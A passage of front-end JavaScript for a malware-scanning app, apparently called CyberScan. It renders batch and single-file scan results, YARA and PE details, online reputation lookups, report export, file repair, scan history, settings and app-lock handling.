        item.result = r; item.status = "done";
        saveHistory(r);
      } catch (err) { item.status = "error"; item.error = err.message; }
      renderBatch();
    }
    S.batch.running = false;
    renderBatch();
    const done = S.batch.items.filter((i) => i.result);
    const bad = done.filter((i) => i.result.classification === "SUSPICIOUS").length, warn = done.filter((i) => i.result.classification === "REVIEW").length;
    toast(t("batchDone")(bad, warn));
    buzz(bad ? [40, 60, 40, 60, 80] : warn ? [30, 50, 30] : [15]);
  }
  const RISK = { NO_INDICATORS_OBSERVED: "--ok", REVIEW: "--warn", SUSPICIOUS: "--bad" };
  function renderBatch() {
    const b = S.batch; if (!b) return;
    const n = b.items.length, d = b.items.filter((i) => !["wait", "run"].includes(i.status)).length;
    $("batch-title").textContent = t("batchTitle")(n);
    $("batch-count").textContent = t("batchCount")(d, n);
    $("batch-bar").style.width = `${(d / n) * 100}%`;
    $("batch-stop").hidden = !b.running;
    $("batch-done").hidden = b.running;
    $("batch-list").replaceChildren(...b.items.map((item) => {
      const li = el("li", `b-${item.status}`);
      const r = item.result;
      li.style.setProperty("--sev", `var(${r ? RISK[r.classification] || "--muted" : "--line"})`);
      const score = el("em", "b-score", r ? String(r.combined_score) : item.status === "run" ? "…" : "–");
      const text = el("div");
      text.append(el("b", "", item.file.name), el("span", "", r ? `${t("verdicts")[r.classification]} · ${fmtBytes(item.file.size)}` : { wait: t("bWait"), run: t("bRun"), skip: t("bSkip"), error: t("bErr") }[item.status] || ""));
      li.append(score, text);
      if (r) {
        li.tabIndex = 0; li.setAttribute("role", "button");
        li.addEventListener("click", () => { S.last = r; S.lastFile = { name: item.file.name, buffer: item.buffer }; $("batch").hidden = true; renderResult(r, true); });
      }
      return li;
    }));
  }
  $("batch-stop").addEventListener("click", () => { if (S.batch) S.batch.stop = true; });
  $("batch-done").addEventListener("click", newScan);
  $("back-batch").addEventListener("click", () => { $("result").hidden = true; $("batch").hidden = false; window.scrollTo({ top: 0 }); });

  /* ---------------- result ---------------- */
  const TONE = { ok: "--ok", warn: "--warn", danger: "--bad", neutral: "--muted", info: "--cyan" };
  const SEV = { high: "--bad", critical: "--bad", medium: "--warn", low: "--cyan", info: "--muted" };
  function renderResult(r, animate) {
    $("compose").hidden = true; $("result").hidden = false;
    $("back-batch").hidden = !(S.batch && S.batch.items.some((i) => i.result === r));
    const p = (r.plain && (r.plain[lang] || r.plain.en)) || null;
    const s = p && p.summary;
    document.documentElement.style.setProperty("--risk", `var(${s ? TONE[s.tone] || "--cyan" : "--cyan"})`);
    $("badge").textContent = `${s ? s.symbol + " " : ""}${t("verdicts")[r.classification] || r.classification}`;
    $("headline").textContent = s ? s.headline : r.classification;
    $("sentence").textContent = s ? s.sentence : r.summary;
    $("advice").textContent = s ? [s.advice, s.limit].filter(Boolean).join(" ") : "";
    $("notice").hidden = !(s && s.notice); if (s && s.notice) $("notice").textContent = s.notice;
    $("chips").replaceChildren(...((s && s.facts) || []).map((f) => el("span", "", f)), el("span", "", t("onPhone")));
    $("target").textContent = r.target;
    const meter = $("meter"), C = 326.73, off = C * (1 - r.combined_score / 100);
    if (animate) { meter.style.strokeDashoffset = C; requestAnimationFrame(() => requestAnimationFrame(() => { meter.style.strokeDashoffset = off; })); countUp($("score"), r.combined_score); }
    else { meter.style.strokeDashoffset = off; $("score").textContent = r.combined_score; }

    const findings = p ? p.details.findings : [];
    $("findings").replaceChildren(...(findings.length ? findings.map((f) => {
      const li = el("li"); li.style.setProperty("--sev", `var(${SEV[f.severity] || "--muted"})`);
      li.append(el("b", "", f.title + (f.count > 1 ? ` ×${f.count}` : "")));
      if (f.body && f.body !== f.title) li.append(el("span", "", f.body));
      return li;
    }) : [el("li", "", t("noSigns"))]));

    // map of the file
    const mapInfo = r.kind !== "text" && r.kind !== "url" ? (() => { $("map-card").hidden = false; return window.CSViz.map($("map"), r, animate); })() : false;
    $("map-card").hidden = !mapInfo;
    if (mapInfo) {
      $("map-stats").textContent = r.entropy ? t("mapStats")(r.entropy.mean.toFixed(1), r.entropy.peak.toFixed(1)) : "";
      $("map-note").textContent = t("mapNote")(mapInfo.cells, mapInfo.flagged);
    }

    // YARA
    const yara = r.yara || [];
    $("yara-box").hidden = !(r.engines && "YARA" in r.engines) && !yara.length;
    $("yara-count").textContent = yara.length ? String(yara.length) : "";
    $("yara-box").classList.toggle("hot", yara.length > 0);
    $("yara").replaceChildren(...(yara.length ? yara.map((y) => {
      const li = el("li"); li.append(el("b", "", y.rule_name), el("small", "", y.description));
      if ((y.matched_strings || []).length) li.append(el("code", "", y.matched_strings.slice(0, 8).join("  ")));
      return li;
    }) : [el("li", "", t("yaraNone"))]));

    // program details
    $("pe-box").hidden = !r.pe;
    if (r.pe) {
      const box = $("pe"); box.replaceChildren();
      const dl = el("dl", "facts");
      [["Machine", r.pe.machine], ["Subsystem", r.pe.subsystem], ["Timestamp", r.pe.timestamp], ["Imports", r.pe.import_count]]
        .filter(([, v]) => v != null && v !== "").forEach(([k, v]) => { const d = el("div"); d.append(el("dt", "", k), el("dd", "", String(v))); dl.append(d); });
      box.append(dl);
      if ((r.pe.sections || []).length) {
        box.append(el("h4", "", t("peSections")));
        const secs = el("div", "pe-sections");
        r.pe.sections.forEach((x) => {
          const row = el("div", "pe-row"), bar = el("div", "pe-bar"), fill = el("i");
          fill.style.background = `rgb(${window.CSViz.color(x.entropy || 0).join(",")})`;
          bar.append(fill); row.append(el("code", "", x.name || "?"), bar, el("span", "", (x.entropy || 0).toFixed(2)));
          secs.append(row);
          requestAnimationFrame(() => requestAnimationFrame(() => { fill.style.width = `${Math.min(100, ((x.entropy || 0) / 8) * 100)}%`; }));
        });
        box.append(secs);
      }
      if ((r.pe.suspicious_imports || []).length) {
        box.append(el("h4", "", t("peImports")));
        const tags = el("div", "tags"); r.pe.suspicious_imports.forEach((n) => tags.append(el("span", "", n))); box.append(tags);
      }
    }

    $("facts").replaceChildren(...((p && p.details.facts) || []).map(([k, v]) => { const d = el("div"); d.append(el("dt", "", k), el("dd", "", v)); return d; }));

    // fingerprints
    const fp = r.fingerprints || (r.sha256 ? { sha256: r.sha256 } : null);
    $("fp-box").hidden = !fp;
    if (fp) {
      $("fps").replaceChildren(el("p", "muted small", t("fpCopy")), ...["sha256", "sha1", "md5"].filter((k) => fp[k]).map((k) => {
        const b = el("button", "fp"); b.type = "button";
        b.append(el("small", "", k.toUpperCase()), el("code", "", fp[k]));
        b.addEventListener("click", () => copyText(fp[k]));
        return b;
      }));
    }

    $("checks").replaceChildren(...((p && p.details.checks) || []).map((c) => { const li = el("li"); li.append(el("b", "", `${c.symbol} ${c.name}`), el("small", "", c.reason || c.state)); return li; }));
    $("engines").replaceChildren(...Object.entries(r.engines || {}).map(([k, v]) => { const li = el("li"); li.append(el("b", "", k), el("small", "", String(v))); return li; }));
    $("mitre-box").hidden = !(r.mitre || []).length;
    $("mitre").replaceChildren(...(r.mitre || []).map((m) => el("li", "", `${m.id} · ${m.name || ""}`)));
    $("limits").textContent = r.limitations || "";
    renderLookup(r);

    const acts = $("actions"); acts.replaceChildren();
    const add = (label, fn, cls) => { const b = el("button", cls || "", label); b.type = "button"; b.addEventListener("click", fn); acts.append(b); };
    add(t("again"), newScan, "primary-act");
    const summary = `CyberScan · ${r.combined_score}/100 · ${t("verdicts")[r.classification]}\n${$("headline").textContent}\n${r.target}`;
    if (NATIVE) add(t("share"), () => CSNative.shareText("CyberScan", summary).catch(() => {}));
    else if (S.caps.share) add(t("share"), () => navigator.share({ title: "CyberScan", text: summary }).catch(() => {}));
    add(t("exportBtn"), () => openSheet("export-sheet"));
    add(t("copy"), () => copyText(r.report_text || summary));
    if (S.lastFile && S.lastFile.buffer && r.target === S.lastFile.name) add(t("repair"), openRepair);
    if (acts.children.length % 2 === 0) acts.lastElementChild.classList.add("wide");
    if (animate) window.scrollTo({ top: 0, behavior: "smooth" });
  }
  function countUp(node, target) {
    const start = performance.now();
    const step = (now) => { const k = Math.min(1, (now - start) / 1300); node.textContent = Math.round(target * (1 - Math.pow(1 - k, 3))); if (k < 1) requestAnimationFrame(step); };
    requestAnimationFrame(step);
  }
  function newScan() {
    showCompose();
    S.files = []; S.batch = null; $("file").value = "";
    ready();
    window.scrollTo({ top: 0 });
  }

  /* ---------------- online lookups ---------------- */
  function renderLookup(r) {
    const card = $("lookup-card"), list = $("lookup-list"), note = $("lookup-note"), run = $("lookup-run"), state = $("lookup-state");
    const inds = window.CSLookup.indicators(r);
    card.hidden = false; list.replaceChildren(); run.hidden = true; state.textContent = ""; state.className = "pill";
    if (!window.CSLookup.available()) { card.hidden = !inds.length; note.textContent = t("lookupWeb"); return; }
    if (!inds.length) { note.textContent = t("lookupNothing"); return; }
    if (!prefs.lookups) { note.textContent = t("lookupOff"); return; }
    if (!S.keys.abuse && !S.keys.otx) { note.textContent = t("lookupNoKey"); return; }
    note.textContent = t("lookupSent")(inds.map((i) => (i.type === "hash" ? "SHA-256" : i.value)).join(", "));
    run.hidden = false; run.textContent = r.lookups ? t("lookupAgain") : t("lookupRun");
    if (r.lookups) showLookups(r.lookups);
  }
  function showLookups(results) {
    const found = results.filter((x) => x.status === "found").length;
    const state = $("lookup-state");
    state.textContent = found ? `${t("lookupFound")} · ${found}` : results.every((x) => x.status === "error") ? t("lookupError") : t("lookupClean");
    state.className = `pill ${found ? "bad" : results.every((x) => x.status === "error") ? "warn" : "ok"}`;
    $("lookup-list").replaceChildren(...results.map((x) => {
      const li = el("li", `lk-${x.status}`);
      li.append(el("b", "", `${x.source} · ${t("st")[x.status] || x.status}`), el("small", "", [x.label, x.detail].filter(Boolean).join(" — ")));
      return li;
    }));
  }
  async function doLookup(r) {
    const run = $("lookup-run");
    run.disabled = true; $("lookup-state").textContent = t("lookupBusy"); $("lookup-state").className = "pill";
    try {
      const out = await window.CSLookup.run(r, S.keys);
      r.lookups = out.results;
      if (S.last === r) showLookups(out.results);
      updateHistory(r);
      if (out.results.some((x) => x.status === "found")) buzz([40, 60, 40]);
    } finally { run.disabled = false; run.textContent = t("lookupAgain"); }
  }
  $("lookup-run").addEventListener("click", () => S.last && doLookup(S.last));
  function autoLookup(r) {
    if (prefs.lookups && window.CSLookup.available() && (S.keys.abuse || S.keys.otx) && window.CSLookup.indicators(r).length) doLookup(r).catch(() => {});
  }

  /* ---------------- export ---------------- */
  async function exportAs(kind) {
    const r = S.last; if (!r) return;
    const share = $("export-share").checked;
    const verdict = t("verdicts")[r.classification] || r.classification;
    const body = kind === "html" ? window.CSReport.html(r, lang, verdict, r.lookups) : kind === "json" ? window.CSReport.json(r, r.lookups) : window.CSReport.text(r);
    const type = { html: "text/html", json: "application/json", txt: "text/plain" }[kind];
    const file = new File([body], window.CSReport.fileName(r, kind), { type });
    closeSheets();
    await deliver(file, share);
  }
  async function deliver(file, share) {
    try {
      if (NATIVE) {
        if (share) await CSNative.shareFile(file);
        else { const where = await CSNative.save(file); if (where) toast(t("saved")(where)); }
      } else if (share && navigator.canShare && navigator.canShare({ files: [file] })) {
        await navigator.share({ files: [file], title: file.name });
      } else {
        const a = el("a"); a.href = URL.createObjectURL(file); a.download = file.name; document.body.append(a); a.click(); a.remove();
        setTimeout(() => URL.revokeObjectURL(a.href), 4000);
      }
    } catch { /* cancelled */ }
  }
  document.querySelectorAll("#export-sheet [data-x]").forEach((b) => b.addEventListener("click", () => exportAs(b.dataset.x)));
  $("export-cancel").addEventListener("click", closeSheets);

  /* ---------------- sheets ---------------- */
  function openSheet(id) { $(id).hidden = false; buzz(6); }
  function closeSheets() {
    let closed = false;
    ["repair-sheet", "export-sheet", "doc-sheet"].forEach((id) => { if (!$(id).hidden) { $(id).hidden = true; closed = true; } });
    return closed;
  }
  document.querySelectorAll(".sheet-veil").forEach((v) => v.addEventListener("click", (e) => { if (e.target === v && v.id !== "lang-sheet") v.hidden = true; }));

  /* ---------------- repair ---------------- */
  async function openRepair() {
    openSheet("repair-sheet");
    $("repair-out").hidden = true; $("repair-run").hidden = false; $("repair-list").replaceChildren(el("li", "", "…"));
    try {
      const res = await call({ type: "repair-open", name: S.lastFile.name, buffer: S.lastFile.buffer.slice(0) });
      S.repair = res.result;
      const items = S.repair.findings;
      if (!items.length) { $("repair-list").replaceChildren(el("li", "", t("repairNone"))); $("repair-run").hidden = true; return; }
      $("repair-list").replaceChildren(...items.map((f) => {
        const li = el("li", "repair-item"); li.style.setProperty("--sev", `var(${SEV[f.severity] || "--muted"})`);
        const box = el("input"); box.type = "checkbox"; box.value = f.key; box.disabled = !f.repairable; box.checked = f.repairable && f.recommended;
        const text = el("div"); text.append(el("b", "", f.title[lang] || f.title.en), el("span", "", f.body[lang] || f.body.en));
        li.append(box, text); return li;
      }));
    } catch (err) { $("repair-list").replaceChildren(el("li", "", t("failed") + err.message)); }
  }
  $("repair-cancel").addEventListener("click", closeSheets);
  $("repair-run").addEventListener("click", async () => {
    const keys = [...$("repair-list").querySelectorAll("input:checked")].map((b) => b.value);
    if (!keys.length) return;
    const out = $("repair-out"); out.hidden = false; out.replaceChildren(el("p", "muted", "…"));
    try {
      const res = await call({ type: "repair-run", session: S.repair.id, keys });
      const r = res.result;
      if (!r.ok || !res.bytes) { out.replaceChildren(el("b", "", t("repairFail")), el("p", "muted", r.message || "")); return; }
      buzz([20, 40, 20]);
      const file = new File([res.bytes], r.output_name || `repaired-${S.repair.name}`, { type: "application/octet-stream" });
      const save = el("button", "cta small", t("repairSave")); save.type = "button";
      save.addEventListener("click", () => deliver(file, false));
      out.replaceChildren(el("b", "", `✓ ${t("repairDone")}`), el("p", "muted", `${fmtBytes(r.removed_bytes)} · ${r.before} → ${r.after}`), save);
      if (NATIVE || (navigator.canShare && navigator.canShare({ files: [file] }))) {
        const share = el("button", "ghost", t("repairShare")); share.type = "button";
        share.addEventListener("click", () => deliver(file, true));
        out.append(share);
      }
      $("repair-run").hidden = true;
    } catch (err) { out.replaceChildren(el("p", "muted", t("failed") + err.message)); }
  });

  /* ---------------- history (on this phone only) ---------------- */
  const HKEY = "csm-history";
  function loadHistory() { try { return JSON.parse(localStorage.getItem(HKEY) || "[]"); } catch { return []; } }
  function storeHistory(list) {
    try { localStorage.setItem(HKEY, JSON.stringify(list)); } catch {
      try { localStorage.setItem(HKEY, JSON.stringify(list.slice(0, 15))); } catch { /* full */ }
    }
  }
  function slim(r) {
    const s = r.structure;
    return {
      ...r,
      structure: s && s.entropy ? { size: s.size, entropy: s.entropy, flags: s.flags, regions: (s.regions || []).slice(0, 10) } : null,
    };
  }
  function saveHistory(r) {
    if (!prefs.history) return;
    storeHistory([slim(r), ...loadHistory()].slice(0, 60));
  }
  function updateHistory(r) {
    if (!prefs.history) return;
    const list = loadHistory(), i = list.findIndex((x) => x.when === r.when && x.target === r.target);
    if (i >= 0) { list[i] = slim(r); storeHistory(list); }
  }
  const COLORS = { SUSPICIOUS: "#ff4f6d", REVIEW: "#ffc84a", NO_INDICATORS_OBSERVED: "#3dffb0" };
  function renderHistory() {
    const all = loadHistory();
    const q = $("h-search").value.trim().toLowerCase();
    const list = all.filter((r) => (S.filter === "all" || r.classification === S.filter) && (!q || `${r.target} ${(r.fingerprints && r.fingerprints.sha256) || ""} ${r.sha256 || ""}`.toLowerCase().includes(q)));
    // insights
    $("insights").hidden = all.length < 1;
    const counts = { SUSPICIOUS: 0, REVIEW: 0, NO_INDICATORS_OBSERVED: 0 };
    all.forEach((r) => { if (r.classification in counts) counts[r.classification]++; });
    $("ins-total").textContent = all.length; $("ins-bad").textContent = counts.SUSPICIOUS; $("ins-warn").textContent = counts.REVIEW; $("ins-ok").textContent = counts.NO_INDICATORS_OBSERVED;
    if (all.length) { window.CSViz.donut($("donut"), counts, COLORS); window.CSViz.days($("ins-days"), all, COLORS, lang); }
    $("h-search").hidden = all.length < 2; $("h-filters").hidden = all.length < 2;
    $("history-empty").hidden = list.length > 0;
    $("history-empty").textContent = !prefs.history && !all.length ? t("historyOff") : all.length ? t("noMatch") : t("noHistory");
    $("history-actions").hidden = !all.length;
    $("history").replaceChildren(...list.map((r) => {
      const li = el("li", "h-item"); li.style.setProperty("--sev", `var(${RISK[r.classification] || "--muted"})`);
      const p = r.plain && (r.plain[lang] || r.plain.en);
      const body = el("button", "h-open"); body.type = "button";
      body.append(el("b", "", `${r.combined_score} · ${r.target}`), el("span", "", `${p ? p.summary.headline : r.classification} · ${new Date(r.when).toLocaleString(lang)}`));
      body.addEventListener("click", () => { S.last = r; S.lastFile = null; S.batch = null; go("scan"); renderResult(r, true); });
      const del = el("button", "h-del", "×"); del.type = "button"; del.setAttribute("aria-label", "Delete");
      del.addEventListener("click", () => { storeHistory(loadHistory().filter((x) => !(x.when === r.when && x.target === r.target))); renderHistory(); toast(t("removed")); buzz(8); });
      li.append(body, del);
      return li;
    }));
  }
  $("h-search").addEventListener("input", renderHistory);
  document.querySelectorAll("#h-filters .chip").forEach((c) => c.addEventListener("click", () => {
    S.filter = c.dataset.f; document.querySelectorAll("#h-filters .chip").forEach((x) => x.classList.toggle("on", x === c)); buzz(6); renderHistory();
  }));
  $("clear-history").addEventListener("click", () => { try { localStorage.removeItem(HKEY); } catch { /* storage off */ } renderHistory(); toast(t("cleared")); });
  $("export-history").addEventListener("click", () => {
    const list = loadHistory().map(({ structure, report_text, ...rest }) => rest);
    const stamp = new Date().toISOString().slice(0, 10);
    deliver(new File([JSON.stringify({ exported_by: "CyberScan", exported_at: new Date().toISOString(), checks: list }, null, 2)], `cyberscan-history-${stamp}.json`, { type: "application/json" }), false);
  });

  /* ---------------- settings ---------------- */
  function renderSettings() {
    $("set-haptics").checked = prefs.haptics; $("set-warm").checked = prefs.warm; $("set-history").checked = prefs.history;
    $("set-lookups").checked = prefs.lookups; $("set-lock").checked = prefs.lock; $("set-secure").checked = prefs.secure;
    $("set-lookups").disabled = !window.CSLookup.available();
    $("keys").hidden = !(prefs.lookups && window.CSLookup.available());
    $("online-web").hidden = window.CSLookup.available();
    $("key-abuse").value = S.keys.abuse ? "••••••••••••" : ""; $("key-otx").value = S.keys.otx ? "••••••••••••" : "";
    $("install-wrap").hidden = NATIVE;
  }
  const bindToggle = (id, key, after) => $(id).addEventListener("change", async (e) => {
    const on = e.target.checked;
    if (after) { const ok = await after(on); if (ok === false) { e.target.checked = !on; return; } }
    prefs[key] = on; savePrefs(); buzz(6); renderSettings();
  });
  bindToggle("set-haptics", "haptics");
  bindToggle("set-warm", "warm", (on) => { if (on) loadEngine().catch(() => {}); });
  bindToggle("set-history", "history");
  bindToggle("set-lookups", "lookups");
  bindToggle("set-secure", "secure", (on) => (NATIVE ? CSNative.setSecure(on).then(() => true).catch(() => false) : false));
  bindToggle("set-lock", "lock", async (on) => {
    if (!NATIVE) return false;
    if (!on) return true;
    if (!(await CSNative.canLock().catch(() => false))) { toast(t("lockUnavailable")); return false; }
    return CSNative.authenticate(t("lockReason"), "CyberScan").catch(() => false);
  });
  $("keys-save").addEventListener("click", async () => {
    const a = $("key-abuse").value.trim(), o = $("key-otx").value.trim();
    if (a && !a.startsWith("•")) { await CSNative.secret.set("abuse", a); S.keys.abuse = a; }
    if (o && !o.startsWith("•")) { await CSNative.secret.set("otx", o); S.keys.otx = o; }
    toast(t("keysSaved")); renderSettings();
  });
  $("keys-clear").addEventListener("click", async () => {
    await Promise.all(["abuse", "otx"].map((k) => CSNative.secret.remove(k).catch(() => {})));
    S.keys = { abuse: "", otx: "" }; toast(t("keysRemoved")); renderSettings();
  });
  ["key-abuse", "key-otx"].forEach((id) => $(id).addEventListener("focus", (e) => { if (e.target.value.startsWith("•")) e.target.value = ""; }));
  async function loadKeys() {
    if (!NATIVE) return;
    try { S.keys.abuse = await CSNative.secret.get("abuse"); S.keys.otx = await CSNative.secret.get("otx"); } catch { /* none */ }
  }
  function openDoc(page) {
    $("doc-frame").src = `${page}?lang=${lang}`;
    openSheet("doc-sheet");
  }
  $("open-privacy").addEventListener("click", () => openDoc("privacy.html"));
  $("open-licenses").addEventListener("click", () => openDoc("licenses.html"));
  $("doc-close").addEventListener("click", closeSheets);
  $("wipe").addEventListener("click", async () => {
    if (!confirm(t("wipeAsk"))) return;
    try { localStorage.clear(); } catch { /* storage off */ }
    if (NATIVE) { await Promise.all(["abuse", "otx"].map((k) => CSNative.secret.remove(k).catch(() => {}))); CSNative.setSecure(false).catch(() => {}); }
    prefs = { ...DEFAULTS }; S.keys = { abuse: "", otx: "" };
    toast(t("wiped")); renderSettings(); renderHistory();
  });
  async function renderVersion() {
    let v = "1.0.0";
    if (NATIVE) { try { const i = await CSNative.info(); v = `${i.version} (${i.build}) · Android ${i.android}`; } catch { /* web */ } }
    $("version").textContent = t("version")(v);
  }

  /* ---------------- device ---------------- */
  function renderCaps() {
    const c = S.caps; if (!c) return;
    const [name, text] = t("tiers")[c.tier];
    $("tier-name").textContent = name; $("tier-name").className = `tier ${c.tier}`; $("tier-text").textContent = text;
    $("load-engine").hidden = c.tier === "viewer" || S.engine === "ready";
    const L = t("caps"), yn = (v) => (v ? t("yes") : t("no"));
    const rows = [
      ["platform", { ios: "iPhone / iPad", android: "Android", other: lang === "ar" ? "أخرى" : "Other" }[c.platform]],
      ["tier", name], ["wasm", yn(c.wasm)],
      ["memoryGB", c.memoryGB ? `${c.memoryGB} GB` : t("unknown")], ["cores", c.cores || t("unknown")],
      ["network", c.network ? `${c.network}${c.saveData ? " · data saver" : ""}` : t("unknown")],
      ["freeMB", c.freeMB != null ? fmtBytes(c.freeMB * 1048576) : t("unknown")], ["webgl", yn(c.webgl)],
      ["standalone", yn(c.standalone)], ["screen", c.screen],
      ["benchmarkMs", c.benchmarkMs != null ? `${Math.round(c.benchmarkMs)} ms` : "—"],
    ];
    if (engineInfo) {
      rows.push(["python", engineInfo.python]);
      if (engineInfo.yara && engineInfo.yara.rules != null) rows.push(["yara", `${engineInfo.yara.rules} (${engineInfo.yara.reader})`]);
    }
    $("caps").replaceChildren(...rows.map(([k, v]) => { const d = el("div"); d.append(el("dt", "", L[k]), el("dd", "", String(v))); return d; }));
  }
  let installEvent = null;
  window.addEventListener("beforeinstallprompt", (e) => { e.preventDefault(); installEvent = e; renderInstall(); });
  function renderInstall() {
    const box = $("install-card"); if (!box) return;
    if (S.caps && S.caps.standalone) { box.replaceChildren(el("p", "muted", `✓ ${t("installed")}`)); return; }
    const steps = platform === "ios" ? t("installIos") : platform === "android" ? t("installAndroid") : t("installOther");
    const ol = el("ol"); steps.forEach((s) => ol.append(el("li", "", s)));
    box.replaceChildren(ol);
    if (installEvent) {
      const b = el("button", "cta small", t("installBtn")); b.type = "button";
      b.addEventListener("click", async () => { installEvent.prompt(); await installEvent.userChoice.catch(() => {}); installEvent = null; renderInstall(); });
      box.append(b);
    }
  }

  /* ---------------- handed over by Android or the share target ---------------- */
  function receiveText(value) {
    value = value.trim();
    const mode = /^https?:\/\/\S+$/i.test(value) ? "url" : "text";
    go("scan"); showCompose(); setMode(mode);
    $(mode).value = value; ready(); toast(t("shared"));
  }
  function receiveAction(action) {
    if (action === "history") { go("history"); return; }
    go("scan"); showCompose();
    // the window may not have focus yet (Android then hides the clipboard and refuses a picker)
    if (action === "link") { setMode("url"); setTimeout(pasteLink, 600); }
    else if (action === "pick") {
      setMode("file");
      $("picker").classList.add("attn"); setTimeout(() => $("picker").classList.remove("attn"), 2400);
      setTimeout(() => { try { $("file").click(); } catch { /* needs a tap */ } }, 400);
    }
  }
  async function receiveShared() {
    if (NATIVE) {
      CSNative.onShared((item) => {
        if (item.action) receiveAction(item.action);
        else if (item.files) chooseFiles(item.files, t("sharedMany")(item.files.length));
        else if (item.file) chooseFiles([item.file], t("shared"));
        else if (item.text) receiveText(item.text);
      });
      return;
    }
    const params = new URLSearchParams(location.search);
    if (params.get("action")) { receiveAction(params.get("action")); history.replaceState(null, "", location.pathname); }
    if (!params.has("shared") || !("caches" in window)) return;
    const cache = await caches.open("cs-share");
    const file = await cache.match("/m/__shared_file");
    const text = await cache.match("/m/__shared_text");
    if (file) {
      const name = decodeURIComponent(file.headers.get("X-Name") || "shared-file");
      chooseFiles([new File([await file.blob()], name)], t("shared"));
    } else if (text) {
      receiveText(await text.text());
    }
    await cache.delete("/m/__shared_file"); await cache.delete("/m/__shared_text");
    history.replaceState(null, "", location.pathname);
  }

  /* ---------------- app lock, back button ---------------- */
  let pausedAt = 0, locking = false;
  async function lock() {
    if (!NATIVE || !prefs.lock || locking) return;
    locking = true;
    $("lock").hidden = false;
    try {
      if (await CSNative.authenticate(t("lockReason"), "CyberScan")) $("lock").hidden = true;
    } catch { /* stays locked; the button tries again */ }
    locking = false;
  }
  $("unlock").addEventListener("click", lock);
  if (NATIVE) {
    CSNative.onPause(() => { pausedAt = Date.now(); });
    CSNative.onResume(() => { if (prefs.lock && Date.now() - pausedAt > 30000) lock(); });
    CSNative.onBack(() => {
      if (!$("lock").hidden) { CSNative.minimize(); return; }
      if (!$("lang-sheet").hidden) return;
      if (closeSheets()) return;
      if (S.view !== "scan") { go("scan"); return; }
      if (!$("result").hidden && S.batch && S.batch.items.some((i) => i.result === S.last)) { $("result").hidden = true; $("batch").hidden = false; return; }
      if (!$("result").hidden || (!$("batch").hidden && !(S.batch && S.batch.running))) { newScan(); return; }
      CSNative.minimize();
    });
  }

  /* ---------------- start ---------------- */
  (async () => {
    S.caps = await window.CSCaps.measure();
    document.body.classList.add(`tier-${S.caps.tier}`);
    if (NATIVE && prefs.lock) $("lock").hidden = false;
    await loadKeys();
    applyLang();
    firstRun();
    ready();
    if (NATIVE && prefs.lock) lock();
    if (NATIVE && prefs.secure) CSNative.setSecure(true).catch(() => {});
    if (!NATIVE && "serviceWorker" in navigator && window.isSecureContext) navigator.serviceWorker.register("../sw.js").catch(() => {});
    receiveShared().catch(() => {});
    if (prefs.warm && S.caps.tier !== "viewer") loadEngine().catch(() => {});
    window.CSM = { S, loadEngine, call, scan, renderResult, prefs };
  })();
})();
